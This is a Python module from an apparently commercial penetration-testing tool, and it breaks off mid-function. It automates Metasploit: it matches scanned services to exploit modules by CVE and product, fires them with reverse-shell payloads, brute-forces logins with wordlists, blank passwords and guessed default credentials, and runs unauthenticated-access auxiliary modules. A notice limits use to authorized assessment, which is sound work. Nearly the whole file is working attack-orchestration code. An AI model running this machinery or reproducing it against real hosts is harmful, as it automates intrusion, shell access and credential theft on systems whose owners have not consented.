#!/usr/bin/env python3
# =============================================================================
# Location    automation/msf.py
# Author      Keith Pachulski
# Company     Red Cell Security LLC
# Email       keith@redcellsecurity.org
# Website     www.redcellsecurity.org
#
# License     MIT License
#
# Purpose     All Metasploit interaction over msfrpcd: candidate assembly across
#             CVE, product, auxiliary, and curated unauthenticated tiers; the fire
#             path; the credential brute; and the auxiliary run path that records
#             proven unauthenticated access.
#
# SECURITY NOTICE
#             This software is intended for authorized security assessment and
#             defensive operations only. Use it exclusively on systems you own or
#             are explicitly permitted to test. Unauthorized use may violate law.
#
# DISCLAIMER
#             This software is provided "as is" without warranty of any kind. The
#             author and Red Cell Security LLC accept no liability for damage or
#             misuse arising from its operation.
# =============================================================================

"""
msf.py - all Metasploit interaction over msfrpcd.

Owns CVE-to-module search, the Great/Excellent rank filter, the DoS exclusion,
console-driven check, and the fire path (payload selection, LHOST/LPORT, execute,
session attribution by exploit uuid). Concurrency-safe: pymetasploit3 issues one
requests.post per RPC call, checks use an isolated console each, and LPORTs come
from a bounded thread-safe pool. Stopping the handler job after a session lands
frees the listener without killing the session, so LPORTs are safe to reuse.

Connection config comes from the environment (MSF_RPC_HOST, MSF_RPC_PORT,
MSF_RPC_PASS, MSF_RPC_SSL, MSF_RPC_USER) with optional overrides. msfrpcd serves
SSL by default, so ssl defaults to True here even though the library default is
False.
"""

from __future__ import annotations

import logging
import os
import queue
import re
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass

from state import Access, Candidate, Credential, Session

logger = logging.getLogger(__name__)

_ANSI = re.compile(r"\x1b\[[0-9;]*m")

# MSF numeric rank constants and their names.
_RANK_NAMES = {
    0: "manual", 100: "low", 200: "average", 300: "normal",
    400: "good", 500: "great", 600: "excellent",
}
_RANK_VALUES = {v: k for k, v in _RANK_NAMES.items()}

# Public name->value map for callers tuning the rank floor (e.g. --min-rank).
RANK_VALUES = dict(_RANK_VALUES)

# nmap service names that carry no real version and are not worth searching:
# tcpwrapped means the handshake completed but the service closed before any
# banner, unknown/empty means no identification.
_NON_ACTIONABLE_SERVICES = frozenset({"", "tcpwrapped", "unknown"})

# Generic service/product tokens too broad to search Metasploit by name: a bare
# search floods candidates, and the CVE path already covers these. Product-name
# search is skipped when the most specific token is one of these.
_GENERIC_PRODUCT_TOKENS = frozenset({
    "http", "https", "www", "html", "ssl", "tls", "ssh", "smtp", "smtps",
    "imap", "imaps", "pop3", "pop3s", "dns", "domain", "tcp", "udp", "ftp",
    "ftps", "telnet", "ident", "ntp", "snmp", "rpc", "rpcbind", "msrpc",
    "netbios", "microsoft", "generic", "unknown", "service", "server",
    "daemon", "linux", "unix", "windows",
})


def _product_search_terms(service):
    """Distinctive lowercase alphanumeric tokens (>=4 chars, non-generic) from the
    service product (preferred) or name, longest first. Returns a list so a
    multi-word product like 'Apache Tomcat' searches every component rather than
    only the longest token. Empty when nothing specific enough is present.

    The name is only trusted when nmap actually probed the service. nmap fills the
    product field only on a real probe, but the name can be a bare port-table guess
    (method 'table'), for example port 3001 labelled 'nessus' with no banner. Using
    a table guess as a search term fires phantom exploits at a service that was
    never confirmed, so an unprobed name is ignored here and left for display only."""
    source = service.product
    if not source and (service.method or "").lower() == "probed":
        source = service.name
    source = source or ""
    toks = [t for t in re.findall(r"[a-z0-9]+", source.lower())
            if len(t) >= 4 and t not in _GENERIC_PRODUCT_TOKENS]
    out = []
    for t in sorted(toks, key=len, reverse=True):
        if t not in out:
            out.append(t)
    return out


def _product_relevant(term, fullname):
    """True if the module path plausibly matches the product term. Both sides are
    compared with non-alphanumerics stripped, so a concatenated product token
    (unrealircd, from nmap's product field) matches a module path that splits the
    same words (unreal_ircd_3281_backdoor), while the daemon-stripped form still
    matches (distccd -> distcc_exec)."""
    fn = re.sub(r"[^a-z0-9]", "", (fullname or "").lower())
    t = re.sub(r"[^a-z0-9]", "", (term or "").lower())
    if not t:
        return False
    if t in fn:
        return True
    return t.endswith("d") and len(t) > 4 and t[:-1] in fn

_MODULE_TYPES = ("exploit", "auxiliary", "post", "payload", "encoder", "nop", "evasion")

_PLATFORMS = (
    "windows", "linux", "unix", "osx", "android", "apple_ios", "solaris",
    "bsd", "aix", "java", "php", "python", "ruby", "nodejs", "multi",
    "firefox", "mainframe", "netware",
)

# OS-family taxonomy for the candidate platform filter. A module's declared
# platform comes from Metasploit metadata (module.info), not from its path, so
# new platform tokens are inherited automatically. The only static data here is
# the real OS family tree: a module is compatible with a host when its platform
# and the host family share a lineage (one is the other or an ancestor of it).
# Language and runtime platforms are OS-agnostic and always allowed. An unknown
# host family disables the filter entirely (fire-all fallback).
_AGNOSTIC_PLATFORMS = frozenset({
    "multi", "java", "php", "python", "ruby", "nodejs", "perl", "firefox",
    "generic",
})

# child -> parent in the OS family tree. Roots (unix, windows, android, ...) have
# no entry. This is stable OS domain knowledge, not the Metasploit platform list.
_OS_FAMILY_PARENT = {
    "linux": "unix",
    "bsd": "unix",
    "freebsd": "bsd",
    "openbsd": "bsd",
    "netbsd": "bsd",
    "bsdi": "bsd",
    "osx": "bsd",
    "solaris": "unix",
    "aix": "unix",
    "hpux": "unix",
    "irix": "unix",
}

# Synonyms folded to the canonical family token. Kept minimal: this is not a
# platform registry, only known aliases MSF or nmap may emit for the same OS.
_PLATFORM_ALIASES = {
    "macos": "osx", "mac_os": "osx", "mac_os_x": "osx", "darwin": "osx",
    "win": "windows", "win32": "windows", "win64": "windows",
    "nix": "unix", "gnu_linux": "linux",
}

# Tokens recognized when metadata is absent and we fall back to the module path.
# Unified on the family tree so the fallback shares one vocabulary with the match.
_KNOWN_PLATFORM_TOKENS = (
    frozenset(_OS_FAMILY_PARENT)
    | frozenset(_OS_FAMILY_PARENT.values())
    | frozenset({"unix", "windows", "android", "apple_ios", "netware",
                 "mainframe", "solaris"})
    | _AGNOSTIC_PLATFORMS
)


def _normalize_platforms(raw):
    """Module.info platform field (list, comma/space string, or None) to a token set."""
    if not raw:
        return frozenset()
    parts = raw if isinstance(raw, (list, tuple, set)) else re.split(r"[,\s/]+", str(raw))
    out = set()
    for p in parts:
        t = re.sub(r"[^a-z0-9_]", "", str(p).lower())
        if t:
            out.add(_PLATFORM_ALIASES.get(t, t))
    return frozenset(out)


def _family_ancestors(tok):
    """The token plus every ancestor up the OS family tree, self first."""
    seen = [tok]
    cur = tok
    while cur in _OS_FAMILY_PARENT:
        cur = _OS_FAMILY_PARENT[cur]
        if cur in seen:
            break
        seen.append(cur)
    return seen


def _family_compatible(module_plat, host_family):
    """True if a module platform token shares an OS lineage with the host family.
    Agnostic platforms and an unknown host family always pass; otherwise one must be
    an ancestor of the other, so a unix module fires on linux and freebsd does not."""
    if module_plat in _AGNOSTIC_PLATFORMS:
        return True
    if not host_family:
        return True
    mp = _PLATFORM_ALIASES.get(module_plat, module_plat)
    hf = _PLATFORM_ALIASES.get(host_family, host_family)
    if mp == hf:
        return True
    return hf in _family_ancestors(mp) or mp in _family_ancestors(hf)


def _platform_from_path(fullname):
    """Last-resort platform token from the module path, used only when metadata
    carries no platform. One-token set when the path segment names a known family or
    agnostic platform, else an empty set (no constraint)."""
    parts = (fullname or "").split("/")
    if len(parts) >= 2:
        tok = _PLATFORM_ALIASES.get(parts[1], parts[1])
        if tok in _KNOWN_PLATFORM_TOKENS:
            return frozenset({tok})
    return frozenset()


class MsfUnavailable(Exception):
    pass


@dataclass
class MsfConfig:
    host: str = "127.0.0.1"
    port: int = 55553
    password: str = ""
    ssl: bool = True
    username: str = "msf"
    aux_timeout: int = 120           # per-module cap for auxiliary/unauth runs
    exploit_timeout: int = 90
    brute_timeout: int = 600        # per-service login scanner cap
    brute_threads: int = 8          # parallel attempts within one login scanner
    cred_user: str = ""             # default USERNAME for credentialed exploits
    cred_pass: str = ""             # default PASSWORD for credentialed exploits
    candidates_per_service: int = 5
    rank_floor: int = 400           # Good and up
    product_search: bool = True     # also search msf by product/service name
    auxiliary_search: bool = True   # include type=auxiliary in candidate search
    lport_base: int = 4444
    lport_count: int = 32
    lhost: str = ""                 # optional pin; empty means derive per target

    @classmethod
    def from_env(cls, **overrides):
        cfg = cls(
            host=os.environ.get("MSF_RPC_HOST", "127.0.0.1"),
            port=int(os.environ.get("MSF_RPC_PORT", "55553")),
            password=os.environ.get("MSF_RPC_PASS", ""),
            ssl=os.environ.get("MSF_RPC_SSL", "1") not in ("0", "false", "False", "no"),
            username=os.environ.get("MSF_RPC_USER", "msf"),
        )
        for k, v in overrides.items():
            if v is not None and hasattr(cfg, k):
                setattr(cfg, k, v)
        return cfg


class MsfClient:
    def __init__(self, cfg: MsfConfig, on_activity=None):
        self.cfg = cfg
        self._on_activity = on_activity
        self._client = None
        self._lport_pool: queue.Queue = queue.Queue()
        for p in range(cfg.lport_base, cfg.lport_base + cfg.lport_count):
            self._lport_pool.put(p)
        # module fullname -> declared platform token set, cached per run
        self._platform_cache = {}

    def _activity(self, source, text):
        if not self._on_activity:
            return
        try:
            self._on_activity(source, text)
        except Exception:
            pass

    # -- connection --

    def connect(self):
        if not self.cfg.password:
            raise MsfUnavailable("MSF_RPC_PASS is empty; msfrpcd password required")
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except Exception as e:
            raise MsfUnavailable(f"pymetasploit3 not installed: {e}")
        import socket
        import time
        timeout = getattr(self.cfg, "connect_timeout", 90)
        deadline = time.monotonic() + timeout
        # msfrpcd binds its port only after loading the whole framework, which can
        # take tens of seconds after the process spawns. Wait quietly for the port
        # to listen before attempting the RPC connect, so a just-restarted daemon
        # does not fail the run.
        waited = False
        while time.monotonic() < deadline:
            try:
                with socket.create_connection(
                        (self.cfg.host, self.cfg.port), timeout=2):
                    break
            except OSError:
                waited = True
                time.sleep(1.0)
        if waited:
            logger.info("waited for msfrpcd to begin listening on %s:%s",
                        self.cfg.host, self.cfg.port)
        # Port is up (or we ran out of time); attempt the RPC connect, retrying
        # briefly in case the API is not serving yet.
        while True:
            try:
                self._client = MsfRpcClient(
                    self.cfg.password, server=self.cfg.host, port=self.cfg.port,
                    ssl=self.cfg.ssl, username=self.cfg.username)
                ver = self._client.core.version
                logger.info("msfrpcd connected: %s", ver)
                return self
            except Exception as e:
                if time.monotonic() >= deadline:
                    raise MsfUnavailable(
                        f"cannot connect to msfrpcd at "
                        f"{self.cfg.host}:{self.cfg.port} after {timeout}s: {e}")
                time.sleep(2.0)

    def close(self):
        if self._client is not None:
            try:
                self._client.logout()
            except Exception:
                pass

    # -- sessions --

    def session_list(self):
        """Live session table from msfrpcd as {id: meta_dict}. Empty on error."""
        try:
            return dict(self._client.sessions.list or {})
        except Exception as e:
            logger.warning("could not list sessions: %s", e)
            return {}

    def session_handle(self, sid):
        """Resolve a session id to (handle, type_str). (None, '') if not found.
        The handle is the pymetasploit3 session object for read/write. Some session
        types (for example smb) are not interactive read/write consoles and the
        client library raises when constructing a handle for them, so the type is
        read from the session table first and the handle is only built for types
        this console can drive. For those, (None, type_str) is returned so the
        caller can report the type without crashing."""
        sessions = self.session_list()
        key = next((k for k in sessions if str(k) == str(sid)), None)
        if key is None:
            return None, ""
        stype = str(sessions[key].get("type", ""))
        try:
            handle = self._client.sessions.session(key)
        except Exception as e:
            logger.warning("session %s is type '%s' and cannot be attached as an "
                           "interactive console: %s", sid, stype or "unknown", e)
            return None, stype
        return handle, stype

    def session_stop(self, sid):
        """Close a session by id. Returns True if a matching session was found and
        the stop was issued, False if no such session exists. Any RPC error from
        the stop itself propagates to the caller. Session types the client library
        cannot construct a handle for (for example smb) are stopped with a direct
        session.stop RPC call, so any session can be terminated."""
        sessions = self.session_list()
        key = next((k for k in sessions if str(k) == str(sid)), None)
        if key is None:
            return False
        try:
            self._client.sessions.session(key).stop()
        except Exception:
            self._client.call("session.stop", [str(key)])
        return True

    def db_status(self):
        """Raw msfrpcd database status dict, or None if the call fails."""
        try:
            return self._client.db.status
        except Exception as e:
            logger.debug("db.status failed: %s", e)
            return None

    def db_ready(self, probe_cve="CVE-2017-0144", slow_threshold=3.0):
        """True if the postgres cache is connected. Primary signal is db.status
        reporting a connected db; fallback is a timed search, since an uncached
        search is markedly slower than a cached one."""
        st = self.db_status()
        if isinstance(st, dict) and st.get("db"):
            return True
        start = time.time()
        try:
            self._client.modules.search("cve:" + probe_cve)
        except Exception:
            return False
        return (time.time() - start) < slow_threshold

    # -- search and candidate assembly --

    def _search_cve(self, cve_id):
        try:
            res = self._client.modules.search("cve:" + cve_id)
        except Exception as e:
            logger.warning("module search failed for %s: %s", cve_id, e)
            return []
        return res or []

    def _search_term(self, term):
        """Free-text Metasploit module search by product/service name."""
        try:
            res = self._client.modules.search(term)
        except Exception as e:
            logger.warning("module search failed for '%s': %s", term, e)
            return []
        return res or []

    def _acceptable(self, entry):
        """Fireable or runnable module. Exploits and auxiliary both qualify; dos and
        local are excluded (dos is destructive-only, local needs an existing
        session). The exploit rank floor is applied to exploit modules only, since
        auxiliary modules do not carry the exploit rank system and would be filtered
        out wholesale by it."""
        mtype = entry.get("type")
        if mtype == "auxiliary":
            if not self.cfg.auxiliary_search:
                return False
        elif mtype != "exploit":
            return False
        full = entry.get("fullname", "")
        segs = full.split("/")
        if "dos" in segs:
            return False
        if "local" in segs:
            # local priv-esc modules need an existing SESSION; they are not remote
            # entry points and only block with "unset required: SESSION" if fired.
            return False
        if mtype == "exploit" and _rank_value(entry.get("rank")) < self.cfg.rank_floor:
            return False
        return True

    def _module_platforms(self, fullname):
        """Declared platform token set for a module, from module.info and cached for
        the run. Falls back to the module path only when metadata carries no platform,
        and returns an empty set when neither source constrains it (filter allows)."""
        cached = self._platform_cache.get(fullname)
        if cached is not None:
            return cached
        plats = frozenset()
        mtype, _, ref = (fullname or "").partition("/")
        if mtype and ref:
            try:
                info = self._client.call("module.info", [mtype, ref])
            except Exception as e:
                logger.debug("module.info failed for %s: %s", fullname, e)
                info = None
            if isinstance(info, dict):
                plats = _normalize_platforms(info.get("platform"))
        if not plats:
            plats = _platform_from_path(fullname)
        self._platform_cache[fullname] = plats
        return plats

    def _platform_ok(self, fullname, host_os):
        """True if the module may fire at a host of the given OS family. Unknown host
        family allows everything (fire-all fallback); a module with no declared
        platform is allowed; otherwise the module is kept when any declared platform
        shares an OS lineage with the host family, so a freebsd module is dropped on a
        linux host while a unix module is kept."""
        if not host_os:
            return True
        plats = self._module_platforms(fullname)
        if not plats:
            return True
        return any(_family_compatible(p, host_os) for p in plats)

    def candidates_for_service(self, service, host_os=""):
        """Search every CVE on the service plus the product name, filter to fireable
        exploit modules, dedup, rank-sort, and cap. Returns a list of Candidate
        (unchecked). host_os is the target's detected OS family (e.g. 'linux');
        when set, modules built for a different OS family are dropped so we do not
        fire a Solaris or Windows exploit at a Linux host. An empty host_os keeps
        every platform, the fire-all fallback for an unfingerprinted target."""
        if (service.name or "").strip().lower() in _NON_ACTIONABLE_SERVICES:
            return []
        label = service.product or service.name or "service"
        self._activity("msf", f"search exploits {label} :{service.port} "
                              f"({len(service.cves)} cve)")
        by_module = {}
        for cve in service.cves:
            hits = self._search_cve(cve.cve_id)
            logger.debug("search %s (%s:%s) -> %d msf module(s)",
                         cve.cve_id, label, service.port, len(hits))
            for entry in hits:
                full = entry.get("fullname", "")
                if not self._acceptable(entry):
                    logger.debug("  reject %s type=%s rank=%s",
                                 full, entry.get("type"), entry.get("rank"))
                    continue
                if not self._platform_ok(full, host_os):
                    logger.debug("  skip %s (platform vs host '%s')", full, host_os)
                    continue
                logger.debug("  accept %s rank=%s", full, entry.get("rank"))
                cur = by_module.get(full)
                if cur is None or cve.cvss > cur[2]:
                    by_module[full] = (entry, cve.cve_id, cve.cvss)
        # Product-name search: catches modules keyed to a service/product rather
        # than a version CVE -- distcc, and the vsftpd/UnrealIRCd/Samba backdoors --
        # which vulners never attaches a CVE to. Every distinctive product token is
        # searched, not just the longest, so multi-word products (Apache Tomcat)
        # are not missed; a hit is kept only if the token that found it appears in
        # the module path (separators ignored, so unrealircd matches unreal_ircd).
        if self.cfg.product_search:
            for term in _product_search_terms(service):
                self._activity("msf", f"search product {term} :{service.port}")
                hits = self._search_term(term)
                logger.debug("search product '%s' (%s:%s) -> %d msf module(s)",
                             term, label, service.port, len(hits))
                for entry in hits:
                    full = entry.get("fullname", "")
                    if full in by_module:
                        continue
                    if not self._acceptable(entry):
                        continue
                    if not _product_relevant(term, full):
                        logger.debug("  skip irrelevant %s", full)
                        continue
                    if not self._platform_ok(full, host_os):
                        logger.debug("  skip %s (platform vs host '%s')",
                                     full, host_os)
                        continue
                    logger.debug("  accept %s rank=%s via product '%s'",
                                 full, entry.get("rank"), term)
                    by_module[full] = (entry, "", 0.0)
        # Prefer exploits over auxiliary for the same service, always. An auxiliary
        # scanner may merely detect what an exploit module can actually leverage
        # (java_rmi_server is the classic case: the scanner reports class-loader
        # enabled, the exploit lands a session). Sort by module type first so every
        # exploit is attempted before any auxiliary, then by MSF rank within type.
        # Auxiliary is still kept as a fallback for services with no exploit module
        # and for the genuine unauthenticated-access modules that have no exploit
        # equivalent (anonymous FTP, unauthenticated Redis, null-session SMB).
        def _order_key(t):
            entry = t[0]
            is_exploit = not entry.get("fullname", "").startswith("auxiliary/")
            return (0 if is_exploit else 1, -_rank_value(entry.get("rank")))

        ranked = sorted(by_module.values(), key=_order_key)
        ranked = ranked[: self.cfg.candidates_per_service]
        out = []
        for entry, cve_id, _cvss in ranked:
            full = entry.get("fullname", "")
            src = "auxiliary" if full.startswith("auxiliary/") else "msf"
            out.append(Candidate(
                module=full, cve_id=cve_id,
                rank=_rank_name(entry.get("rank")), port=service.port,
                source=src))
        if out:
            logger.info("search %s:%s cves=%d -> %d candidate(s): %s",
                        label, service.port, len(service.cves), len(out),
                        ", ".join(c.module for c in out))
        else:
            logger.info("search %s:%s cves=%d -> 0 fireable modules "
                        "(rank floor %d%s)", label, service.port,
                        len(service.cves), self.cfg.rank_floor,
                        f", host '{host_os}'" if host_os else "")
        return out

    # -- check (console path) --

    def _console_run(self, console, cmd, timeout):
        try:
            console.read()  # clear buffer
        except Exception:
            pass
        console.write(cmd)
        data = ""
        start = time.time()
        while True:
            time.sleep(0.5)
            try:
                data += console.read().get("data", "")
            except Exception:
                break
            busy = False
            try:
                busy = bool(console.is_busy())
            except Exception:
                busy = False
            if not busy and data.strip():
                break
            if time.time() - start > timeout:
                break
        return data

    def fire(self, candidate, host, rhost, port):
        """Detonate the module against rhost with a single selected reverse payload.
        Returns (session, status, detail). status is one of:
          session    - a session opened
          no_session - the module fired (execute was accepted) but nothing called
                       back within the timeout. This is the only clean negative.
          blocked    - no fair attempt was made: an option we needed was unset or
                       rejected, no compatible payload, no derivable LHOST, the
                       LPORT pool was empty, or MSF refused to run the module.
          error      - an exception was raised during the attempt.
        Only no_session means the target got a real attempt and did not yield;
        every other non-session status flags a tooling gap to review, so a real
        flaw is never buried under a generic failure. detail carries the reason.
        One payload is tried per fire: the best pick from _select_payload, ordered
        for reliability (interpreter and native shells first, meterpreter last).
        The handler job is always stopped in teardown, which frees the LPORT and
        leaves any session intact."""
        lport = self._lport_acquire()
        if lport is None:
            return self._blocked(candidate, rhost, "LPORT pool exhausted")
        job_id = None
        try:
            modref = _strip_type(candidate.module)
            exploit = self._client.modules.use("exploit", modref)
            payload_name = _select_payload(exploit, candidate.module, host)
            if payload_name is None:
                return self._blocked(candidate, rhost, "no compatible payload")
            payload = self._client.modules.use("payload", payload_name)
            lhost = self.cfg.lhost or _lhost_for(rhost)
            if not lhost:
                return self._blocked(candidate, rhost, "could not derive LHOST")
            # Set everything we can derive, recording any set the module rejected
            # rather than swallowing it. RHOSTS/RHOST and RPORT go on the exploit;
            # LHOST/LPORT go on the payload and ride into the exploit on the merge
            # at execute time.
            fails = _apply_options(exploit, [("RHOSTS", rhost), ("RHOST", rhost)])
            if port:
                fails += _apply_options(exploit, [("RPORT", int(port))])
            fails += _apply_options(payload, [("LHOST", lhost),
                                              ("LPORT", int(lport))])
            # Required exploit options with no default that are still unset, minus
            # whatever the payload merge will supply. Anything outstanding is
            # module-specific (creds, a target URI with no default, and so on) we
            # will not guess. A rejected set above counts too: that value did not
            # take. Either way we cannot make a fair attempt, so block with the
            # exact reason instead of firing blind into MSF option validation.
            supplied = set(payload.runoptions)
            outstanding = [o for o in exploit.missing_required
                           if o not in supplied]
            if outstanding:
                # Credential options (USERNAME/PASSWORD and friends) that the module
                # requires with no default get a best-guess value so a credentialed
                # module gets a fair attempt instead of a block. Everything else
                # still blocks: we do not invent target URIs or module-specific
                # values. Recompute after filling.
                fails += self._satisfy_outstanding(exploit, outstanding)
                supplied = set(payload.runoptions)
                outstanding = [o for o in exploit.missing_required
                               if o not in supplied]
            if outstanding or fails:
                parts = []
                if outstanding:
                    parts.append("unset required: "
                                 + ", ".join(sorted(outstanding)))
                if fails:
                    parts.append("rejected: " + ", ".join(
                        f"{k}={v!r} ({why})" for k, v, why in fails))
                return self._blocked(candidate, rhost, "; ".join(parts))
            self._activity("fire", f"execute {candidate.module} "
                                   f"payload={payload_name} LHOST={lhost} "
                                   f"LPORT={lport} @ {rhost}")
            logger.info("fire %s @ %s:%s payload=%s LHOST=%s LPORT=%s",
                        candidate.module, rhost, port, payload_name, lhost, lport)
            # Session ids present before we fire, so _await_session only claims a
            # session that opened from this attempt and never an unrelated one.
            try:
                baseline = set(self._client.sessions.list or {})
            except Exception:
                baseline = set()
            result = exploit.execute(payload=payload)
            if not isinstance(result, dict) or not result.get("uuid"):
                err = ""
                if isinstance(result, dict):
                    err = (result.get("error_message")
                           or result.get("error_string") or "")
                # No uuid means MSF never started the module: a setup or validation
                # problem, not the target resisting. Block so it gets reviewed
                # instead of being filed as a clean miss.
                return self._blocked(candidate, rhost,
                                     err or "execute returned no uuid")
            uuid = result.get("uuid")
            job_id = result.get("job_id")
            matched = self._await_session(
                uuid, candidate.module, rhost, self.cfg.exploit_timeout,
                baseline)
            if matched is None:
                logger.info("fire %s @ %s -> no session", candidate.module, rhost)
                return None, "no_session", "fired, no session within timeout"
            sid, sdict = matched
            logger.info("fire %s @ %s -> SESSION %s opened", candidate.module,
                        rhost, sid)
            session = Session(
                session_id=str(sid), module=candidate.module,
                payload=payload_name,
                info=str(sdict.get("info") or sdict.get("desc") or ""))
            return session, "session", f"session {sid} ({payload_name})"
        except Exception as e:
            logger.warning("fire error %s on %s: %s", candidate.module, rhost, e)
            return None, "error", f"fire error: {e}"
        finally:
            if job_id is not None:
                try:
                    self._client.jobs.stop(str(job_id))
                except Exception:
                    pass
            self._lport_release(lport)

    def _blocked(self, candidate, rhost, detail):
        """Log a blocked fire at WARNING and return the blocked tuple. A blocked
        fire is a tooling gap, not a clean negative, so it is always loud."""
        logger.warning("fire blocked %s @ %s: %s",
                       candidate.module, rhost, detail)
        self._activity("fire", f"blocked {candidate.module}: {detail}")
        return None, "blocked", detail

    def _satisfy_outstanding(self, exploit, outstanding):
        """Fill required credential options the module left unset, so a module that
        only needs a login gets a fair attempt instead of a block. USERNAME-type
        options take cfg.cred_user (the seclists username list top entry, resolved
        once per run) and PASSWORD-type options take cfg.cred_pass, each with a
        built-in fallback. Non-credential options are left outstanding. Returns any
        sets the module rejected."""
        fails = []
        for opt in outstanding:
            if _is_user_opt(opt):
                val = self.cfg.cred_user or _BUILTIN_USERS[0]
            elif _is_pass_opt(opt):
                val = self.cfg.cred_pass or _BUILTIN_PASSWORDS[1]
            else:
                continue
            logger.debug("filling required %s=%r on %s", opt, val,
                         exploit.modulename)
            fails += _apply_options(exploit, [(opt, val)])
        return fails

    def _await_session(self, uuid, module, rhost, timeout, baseline):
        """Wait up to timeout for a session opened by this fire, returning (sid, dict)
        or None. A session is claimed only when it is new (its id was not in the
        pre-fire baseline) and it either carries this run's exploit_uuid or was opened
        by this module against this host. The exploit_uuid alone is not enough:
        command-shell sessions from cmd/unix reverse payloads and handler-caught
        callbacks routinely land with exploit_uuid empty while via_exploit and the
        target host still identify them, so the old strict-uuid match left real shells
        unattributed and reported them as no session. Restricting to new sessions and
        matching via_exploit plus host keeps a concurrent fire from claiming another's
        session while catching the ones MSF does not tag."""
        start = time.time()
        while time.time() - start < timeout:
            try:
                sessions = self._client.sessions.list or {}
            except Exception:
                sessions = {}
            new = [(sid, s) for sid, s in sessions.items() if sid not in baseline]
            for sid, s in new:
                if uuid and s.get("exploit_uuid") == uuid:
                    return sid, s
            for sid, s in new:
                if s.get("via_exploit") == module and _session_targets(s, rhost):
                    return sid, s
            time.sleep(1.0)
        return None

    # -- LPORT pool --

    def _lport_acquire(self, timeout=30):
        try:
            return self._lport_pool.get(timeout=timeout)
        except queue.Empty:
            return None

    def _lport_release(self, port):
        if port is not None:
            self._lport_pool.put(port)

    # -- brute (console path) --

    def brute_service(self, service, login_module, rhost, port,
                      user_file, pass_file):
        """Run an MSF login scanner against one service on a fresh isolated
        console. STOP_ON_SUCCESS so it takes the first valid pair and stops;
        CreateSession so a session-capable service (ssh/telnet/ftp) opens a real
        session that flows into the run alongside exploit sessions. Returns
        (list[Credential], list[Session]) parsed from the console output. Options
        the module does not declare (USER_FILE on password-only services like vnc
        or redis, CreateSession on db logins) are simply ignored by the module."""
        self._activity("msf", f"brute {login_module} @ {rhost}:{port}")
        cid = None
        try:
            console = self._client.consoles.console()
            cid = console.cid
            lines = [f"use {login_module}", f"set RHOSTS {rhost}"]
            if port:
                lines.append(f"set RPORT {int(port)}")
            lines += [
                f"set USER_FILE {user_file}",
                f"set PASS_FILE {pass_file}",
                "set STOP_ON_SUCCESS true",
                "set CreateSession true",
                "set BLANK_PASSWORDS true",
                "set USER_AS_PASS true",
                "set VERBOSE false",
                f"set THREADS {int(self.cfg.brute_threads)}",
                "run",
            ]
            data = self._console_run(console, "\n".join(lines) + "\n",
                                     self.cfg.brute_timeout)
            creds = _parse_brute_creds(data, service, port, login_module)
            sessions = self._brute_sessions_for(login_module, rhost, creds)
            logger.info("brute %s @ %s:%s -> %d credential(s), %d session(s)",
                        login_module, rhost, port, len(creds), len(sessions))
            return creds, sessions
        except Exception as e:
            logger.warning("brute error %s on %s: %s", login_module, rhost, e)
            return [], []
        finally:
            if cid is not None:
                try:
                    self._client.consoles.destroy(cid)
                except Exception:
                    pass

    def _brute_sessions_for(self, login_module, rhost, creds):
        """Sessions this login scanner opened on rhost, read from the session list
        by (via_exploit, host) rather than scraped from console output. MSF
        broadcasts the 'session N opened' event to every console reading at once,
        so with a wide brute pool output scraping counts other modules' sessions;
        the session list attributes each session to the module and host that
        created it. Brute targets are deduped per (host, module), so this pair is
        unique to this call. Found credentials are linked to the opened sessions in
        id order (a login scanner only opens a session on success)."""
        try:
            live = self._client.sessions.list or {}
        except Exception:
            return []
        matched = []
        for sid, meta in live.items():
            if meta.get("via_exploit") != login_module:
                continue
            host = (meta.get("session_host") or meta.get("target_host")
                    or _peer_host(meta.get("tunnel_peer", "")))
            if host != rhost:
                continue
            matched.append(str(sid))
        matched.sort(key=lambda s: int(s) if s.isdigit() else 0)
        sessions = []
        for i, sid in enumerate(matched):
            cred = creds[i] if i < len(creds) else None
            if cred is not None:
                cred.session_id = sid
            info = f"{cred.username}:{cred.password}" if cred else ""
            sessions.append(Session(session_id=sid, module=login_module,
                                    payload="", info=info))
        return sessions


    def unauth_candidates_for_service(self, service):
        """Curated unauthenticated and misconfiguration auxiliary modules for this
        service, as Candidates (source 'unauth'). Independent of CVE and product
        search; these prove access with no credentials and no exploit."""
        mods = unauth_modules_for(service.name, service.port)
        return [Candidate(module=m, cve_id="", rank="", port=service.port,
                          source="unauth") for m in mods]

    def run_auxiliary(self, candidate, rhost, port, service_name=""):
        """Run an auxiliary or unauth module against rhost and read MSF's own
        success convention: lines prefixed [+] are positive findings. Each becomes
        an Access record carrying that proof line, so a null SMB session, an
        anonymous FTP listing, or an unauthenticated Redis is captured as proven
        impact rather than a maybe. RHOSTS/RPORT are set and any remaining required
        credential-style options are filled the same way fire does; module-specific
        options are left to the module's defaults. Never raises; a tooling problem
        yields no access. Returns (list[Access], detail)."""
        self._activity("aux", f"run {candidate.module} @ {rhost}:{port}")
        cid = None
        try:
            console = self._client.consoles.console()
            cid = console.cid
            lines = [f"use {candidate.module}", f"set RHOSTS {rhost}"]
            if port:
                lines.append(f"set RPORT {int(port)}")
            lines.append("run")
            data = self._console_run(console, "\n".join(lines) + "\n",
                                     self.cfg.aux_timeout)
            access = []
            seen = set()
            for raw in data.splitlines():
                ln = _ANSI.sub("", raw).strip()
                if not ln.startswith("[+]"):
                    continue
                proof = ln[3:].strip()[:200]
                if not proof or proof in seen:
                    continue
                seen.add(proof)
                access.append(Access(
                    service=service_name or "", port=int(port) if port else 0,
                    module=candidate.module, proof=proof))
            detail = (f"{len(access)} positive finding(s)" if access
                      else "no access")
            logger.info("aux %s @ %s:%s -> %s", candidate.module, rhost, port,
                        detail)
            return access, detail
        except Exception as e:
            logger.warning("aux error %s on %s: %s", candidate.module, rhost, e)
            return [], f"aux error: {e}"
        finally:
            if cid is not None:
                try:
                    self._client.consoles.destroy(cid)
                except Exception:
                    pass



# --- module helpers (no live server required) ------------------------------

def _rank_value(rank):
    if isinstance(rank, bool):
        return 0
    if isinstance(rank, (int, float)):
        return int(rank)
    if isinstance(rank, str):
        r = rank.strip().lower()
        if r.isdigit():
            return int(r)
        return _RANK_VALUES.get(r, 0)
    return 0


def _rank_name(rank):
    if isinstance(rank, bool):
        return "unknown"
    if isinstance(rank, (int, float)):
        return _RANK_NAMES.get(int(rank), str(int(rank)))
    if isinstance(rank, str):
        r = rank.strip().lower()
        if r.isdigit():
            return _RANK_NAMES.get(int(r), r)
        return r
    return "unknown"


def _strip_type(full):
    parts = full.split("/", 1)
    if parts[0] in _MODULE_TYPES and len(parts) > 1:
        return parts[1]
    return full


def _platform_from_module(full):
